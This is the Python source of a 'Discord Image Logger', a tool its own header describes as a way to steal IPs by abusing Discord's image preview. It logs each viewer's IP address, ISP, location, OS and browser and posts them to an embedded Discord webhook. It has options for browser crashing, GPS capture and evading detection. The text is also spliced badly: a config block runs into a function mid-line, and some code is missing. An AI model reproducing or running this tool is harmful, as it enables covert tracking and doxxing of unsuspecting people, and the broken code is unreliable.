# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1511007192617324717/l5a2pBfc7QATtb3OP4Ek8tW6GZHHZupl3oLhrIx32aKab8h5NSNfMpSqbEje9P1GSY8M",
    "image": "https://upload.wikimedia.org/wikipedia/en/thumb/2/27/Bliss_%28Windows_XP%29.png/330px-Bliss_%28Windows_XP%29.png",  # You can also have a custom image by using a URL argument
                                                   # (E.g. yoursite.com/imageLogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger",  # Set this to the name you want the webhook to have
    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False,  # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)

    "accurateLocation": False,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": {  # Show a custom message when the user opens the image
        "doMessage": False,  # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
        "richMessage": True,  # Enable rich text? (SEE README for more info)
    },

    "vpnCheck": 1,  # Prevents VPNs from triggering the alert
                    # 0 = No Anti-VPN
                    # 1 = Don't ping when a VPN is suspected
                    # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True,  # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)

    "buggedImage": True,  # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1,  # Prevents bots from triggering the alert
                   # 0 = No Anti-Bot
                   # 1 = Don't ping when it's possibly a bot
                   # 2 = Don't ping when it's 100% a bot
                   # 3 = Don't send an alert when it's possibly a bot
                   # 4 = Don't send an alert when it's 100% a bot

    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect to a webpage?
        "page": "https://your-link.here"  # Link to the webpage to redirect to
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)def botCheck(ip, useragent):
    if "Discord" in ...:
        return "Discord"

    elif useragent.startswith("TelegramBot"):
        return "Telegram"

    else:
        return False


def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```{error}```",
            },
        ]
    })


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f'An "**Image Logging**" link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n...',
                }
            ],
        }) if config["linkAlerts"] else None  # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(
        f"http://ip-api.com/json/{ip}?fields=16976857"
    ).json()

    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return

        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
            return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**

> **IP:** `{ip if ip else "Unknown"}`
> **Provider:** `{info['isp'] if info['isp'] else "Unknown"}`
> **ASN:** `{info['as'] if info['as'] else "Unknown"}`
> **Country:** `{info['country'] if info['country'] else "Unknown"}`
> **Region:** `{info['regionName'] if info['regionName'] else "Unknown"}`
> **City:** `{info['city'] if info['city'] else "Unknown"}`
> **Coords:** `{str(info['lat']) + "," + str(info['lon']) if not coords else coords.replace(',', ', ')}`
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else "Possibly" if info['hosting'] else "False"}`

**PC Info:**

> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**"""
            }
        ]
    }
